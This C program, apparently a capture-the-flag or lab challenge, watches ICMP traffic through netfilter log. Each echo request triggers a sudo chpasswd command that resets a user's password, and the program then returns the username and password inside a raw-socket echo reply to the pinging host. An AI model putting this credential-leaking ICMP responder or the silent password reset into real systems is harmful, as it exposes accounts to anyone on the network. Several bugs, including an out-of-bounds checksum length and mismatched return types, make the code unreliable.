#include <netinet/in.h>       // IPPROTO_RAW, IPPROTO_IP, IPPROTO_ICMP, INET_ADDRSTRLEN
#include <netinet/ip.h>       // struct ip and IP_MAXPACKET (which is 65535)
#include <netinet/ip_icmp.h>  // struct icmp, ICMP_ECHO
#include <libnfnetlink/libnfnetlink.h>
#include <libnetfilter_log/libnetfilter_log.h>
#include <stdio.h>
#include <stdint.h>

#include <sys/socket.h>
#include <arpa/inet.h>
/*#include <netinet/in.h>
#include <netinet/ip.h>
#include <libnetfilter_log/libnetfilter_log.h>
#include <sys/types.h>
*/

/*
    Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
 
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
 
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
 
    return (answer);
}

void reply_icmp(unsigned long daddr, unsigned long saddr, u_int16_t id, u_int16_t sequence, int _payload_size, unsigned char *_payload) {

    // reset the user passwords to defaults
    system("echo userName:thePassword | sudo /usr/sbin/chpasswd");

    const char flag[] = "userName:thePassword";

    unsigned char *payload;
    int payload_size;

    int padding_size = 0; //rand() % 10;

    payload_size = _payload_size + strlen(flag) + padding_size;
    payload = malloc(payload_size);
    memcpy(payload,_payload,_payload_size);
    memcpy(payload+_payload_size,flag,strlen(flag));
    memset(payload+_payload_size+strlen(flag),0x00,padding_size);

    struct in_addr _daddr = {daddr};
    printf( "DADDR: %s\n", inet_ntoa( _daddr ) );
    struct in_addr _saddr = {saddr};
    printf( "SADDR: %s\n", inet_ntoa( _saddr ) );
    int sent, sent_size;

    //Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
     
    if (sockfd < 0) 
    {
        printf("could not create socket\n");
        return (0);
    }
     
    int on = 1;
     
    // We shall provide IP headers
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        printf("setsockopt\n");
        return (0);
    }
     
    //allow socket to send datagrams to broadcast addresses
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        printf("setsockopt\n");
        return (0);
    }   
     
    //Calculate total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);
                    
    if (!packet) 
    {
        printf("out of memory\n");
        close(sockfd);
        return (0);
    }
     
    //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
     
    //zero out the packet buffer
    memset (packet, 0, packet_size);
 
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand ();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));
 
    icmp->type = ICMP_ECHOREPLY;
    icmp->code = 0;
    icmp->un.echo.sequence = sequence;
    icmp->un.echo.id = id;
    //checksum
    icmp->checksum = 0;
     
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

    memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), payload, payload_size);
//    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size, 0xAA, 5);
         
    //recalculate the icmp header checksum since we are filling the payload with random characters everytime
    icmp->checksum = 0;
    icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size + 5);
         
    if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
    {
        perror("send failed\n");
    } else {
        printf("%d bytes sent\n", sent_size);
    }
}

print_icmp(struct icmphdr *h, int payload_len, unsigned long saddr, unsigned long daddr)
{ 
int icmp_payload_len=payload_len-sizeof(struct icmphdr);
unsigned char *icmp_payload = (unsigned char *) malloc(icmp_payload_len);
memcpy(icmp_payload,(unsigned char *)h+sizeof(struct icmphdr),icmp_payload_len);


printf("ICMP PAYLOAD LEN=%d\n",icmp_payload_len);
 for(int i=0;i<icmp_payload_len;i++)
    printf("%02x", (unsigned char) icmp_payload[i]);
    printf("\n");
    char tmp[INET_ADDRSTRLEN];
    u_int32_t gateway;

    printf("PROTO=ICMP \n");

    if (payload_len < sizeof(struct icmphdr)) {
        printf("LEN=%d \n", payload_len);
        printf("INVALID=LEN \n");
        return -1;
    }
    
printf("DATA LEN=%u\n", payload_len - sizeof(h));

    printf("TYPE=%u CODE=%u \n", h->type, h->code);

    switch (h->type) {
    case ICMP_ECHO:
       reply_icmp(saddr, daddr,h->un.echo.id,h->un.echo.sequence,icmp_payload_len,icmp_payload);
       break;
    case ICMP_ECHOREPLY:
        printf("ID=%u SEQ=%u \n", ntohs(h->un.echo.id), ntohs(h->un.echo.sequence));
        break;
    case ICMP_PARAMETERPROB:
        printf("PARAMETER=%u \n", ntohl(h->un.gateway) >> 24);
        break;
    case ICMP_REDIRECT:
        gateway = ntohl(h->un.gateway);
        inet_ntop(AF_INET, &gateway, tmp, sizeof(tmp));                
        printf("GATEWAY=%s \n", tmp);
        break;
    case ICMP_DEST_UNREACH:
        if (h->code == ICMP_FRAG_NEEDED) {
            printf("MTU=%u \n", ntohs(h->un.frag.mtu));
        }
        break;
    }

    return 0;
}

print_iphdr(char * payload, int payload_len)
{
    if (payload_len < sizeof(struct iphdr)) {
       printf("LEN=%d \n", payload_len);
       printf("INVALID=LEN \n");
       return -1;
    }

    struct iphdr *h = (struct iphdr *)payload;

    if (payload_len <= (u_int32_t)(h->ihl * 4)) {
        printf("INVALID=IHL \n");
        return -1;
    }

    char tmp[INET_ADDRSTRLEN];
   
    inet_ntop(AF_INET, &h->saddr, tmp, sizeof(tmp));                
    printf("SRC=%s \n", tmp);
    inet_ntop(AF_INET, &h->daddr, tmp, sizeof(tmp));                
    printf("DST=%s \n", tmp);

    printf("LEN=%u TOS=0x%02X PREC=0x%02X TTL=%u ID=%u ",
             ntohs(h->tot_len),  h->tos & IPTOS_TOS_MASK,
             h->tos & IPTOS_PREC_MASK, h->ttl, ntohs(h->id));
                
    short ip_off = ntohs(h->frag_off);
    if (ip_off & IP_OFFMASK) 
        printf("FRAG=%u ", ip_off & IP_OFFMASK);

    if (ip_off & IP_DF) printf("DF ");
    if (ip_off & IP_MF) printf("MF ");

    void *nexthdr = (u_int32_t *)h + h->ihl;
    payload_len -= h->ihl * 4;

    switch (h->protocol) {
    /*case IPPROTO_TCP:
        print_tcp((struct tcphdr *)nexthdr, payload_len);
        break;
    case IPPROTO_UDP:
        print_udp((struct udphdr *)nexthdr, payload_len);
        break;*/
    case IPPROTO_ICMP:
        print_icmp((struct icmphdr *)nexthdr, payload_len,h->saddr,h->daddr);
        break;
/*    case IPPROTO_SCTP:
        print_sctp((struct sctphdr *)nexthdr, payload_len);
        break;
    case IPPROTO_AH:
        printf("PROTO=AH ");
        break;
    case IPPROTO_ESP:
        printf("PROTO=ESP ");
        break;
    case IPPROTO_IGMP:
        printf("PROTO=IGMP ");
        break;*/
     default:
        printf("PROTO=%u ", h->protocol);
    }

    return 0;
}

static int callback(struct nflog_g_handle *gh, struct nfgenmsg *nfmsg, struct nflog_data *ldata, void *data)
{
    char *payload;
    int payload_len = nflog_get_payload(ldata, &payload);
    int hwhdrlen = nflog_get_msg_packet_hwhdrlen(ldata);
    u_int16_t hw_protocol = 0;
    struct nfulnl_msg_packet_hdr *ph = NULL;

    print_iphdr(payload, payload_len);
}

void main () {
    struct nflog_handle *h;
    struct nflog_g_handle *qh;
    ssize_t rv;
    char buf[4096];
    int fd = -1;

    h = nflog_open();
    if (!h) {
            fprintf(stderr, "error during nflog_open()\n\n");
            return 1;
    }
    if (nflog_unbind_pf(h, AF_INET) < 0) {
            fprintf(stderr, "error nflog_unbind_pf()\n\n");
            return 1;
    }
    if (nflog_bind_pf(h, AF_INET) < 0) {
            fprintf(stderr, "error during nflog_bind_pf()\n\n");
            return 1;
    }
    qh = nflog_bind_group(h, 0);
    if (!qh) {
            fprintf(stderr, "no handle for group 0\n\n");
            return 1;
    }

    if (nflog_set_mode(qh, NFULNL_COPY_PACKET, 0xffff) < 0) {
            fprintf(stderr, "can't set packet copy mode\n\n");
            return 1;
    }

    nflog_callback_register(qh, &callback, NULL);

    fd = nflog_fd(h);

    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
            nflog_handle_packet(h, buf, rv);
    }
}

